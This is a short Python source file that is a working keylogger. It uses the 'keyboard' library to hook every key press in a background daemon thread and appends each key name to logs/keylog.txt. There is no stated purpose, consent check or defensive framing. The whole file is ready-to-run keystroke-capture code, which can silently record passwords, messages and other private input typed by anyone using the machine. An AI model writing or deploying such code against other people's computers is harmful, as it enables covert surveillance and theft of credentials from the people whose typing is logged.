import keyboard
import threading
import os

os.makedirs("logs", exist_ok=True)

def log_key(event):
    with open("logs/keylog.txt", "a") as f:
        f.write(event.name + "\n")

def start_keylogger():
    threading.Thread(target=lambda: keyboard.on_press(log_key), daemon=True).start()
